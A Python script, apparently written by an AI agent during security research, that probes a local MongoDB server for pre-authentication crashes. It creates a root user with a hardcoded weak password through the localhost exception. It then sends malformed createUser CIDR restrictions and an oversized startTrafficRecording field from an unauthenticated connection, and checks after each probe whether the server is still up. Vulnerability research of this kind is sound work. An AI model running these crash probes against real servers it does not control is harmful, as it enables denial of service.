#!/usr/bin/env python3
import sys
sys.path.insert(0, "/tmp/claude-0/-home-user-mongo/88417634-60f9-5bda-b080-646aad79e105/scratchpad")
import pymongo
from pymongo.errors import PyMongoError

HOST, PORT = "127.0.0.1", 27118


def is_alive():
    try:
        pymongo.MongoClient(HOST, PORT, serverSelectionTimeoutMS=2000).admin.command("ping")
        return True
    except Exception as e:
        print("Server appears DOWN:", repr(e))
        return False


# Step 1: use the localhost exception to create an admin user (closes the exception window).
c = pymongo.MongoClient(HOST, PORT, serverSelectionTimeoutMS=5000)
try:
    c.admin.command("createUser", "admin", pwd="adminpw123", roles=["root"])
    print("admin user created (localhost exception consumed)")
except PyMongoError as e:
    print("createUser result:", repr(e))
c.close()

# Step 2: reconnect WITHOUT authenticating and confirm we're now truly unauthenticated.
unauth = pymongo.MongoClient(HOST, PORT, serverSelectionTimeoutMS=5000)
try:
    r = unauth.admin.command("usersInfo", {"forAllDBs": True})
    print("UNEXPECTED: unauthenticated privileged command succeeded:", r)
except PyMongoError as e:
    print("confirmed unauthenticated (expected Unauthorized):", repr(e))

# Step 3: send crash candidates as this same unauthenticated connection.
tests = [
    ("unauth createUser w/ malformed CIDR authenticationRestrictions",
     {"createUser": "x", "pwd": "x", "roles": [],
      "authenticationRestrictions": [{"clientSource": ["10.0.0.0/notanumber"]}]}),
    ("unauth createUser w/ CIDR quote-trick (paren style, sanity noise check)",
     {"createUser": "x", "pwd": "x", "roles": [],
      "authenticationRestrictions": [{"clientSource": ["10.0.0.0/999999999999999999999999"]}]}),
    ("unauth startTrafficRecording overflow (re-confirm truly pre-auth, not just low-priv)",
     {"startTrafficRecording": 1, "destination": "/tmp/trafrec2", "maxFileSize": "9" * 400}),
]

for label, cmd in tests:
    if not is_alive():
        print("!!! server already down, skipping:", label)
        continue
    try:
        r = unauth.admin.command(cmd)
        print(f"[{label}] OK (no crash, command succeeded unexpectedly):", r)
    except PyMongoError as e:
        print(f"[{label}] PyMongoError (server responded, no crash):", repr(e))
    except Exception as e:
        print(f"[{label}] UNEXPECTED/CONNECTION ERROR:", repr(e))
    alive = is_alive()
    print("  -> alive after:", alive)
    if not alive:
        print(f"*** CRASH CONFIRMED (unauthenticated): {label} ***")
        break
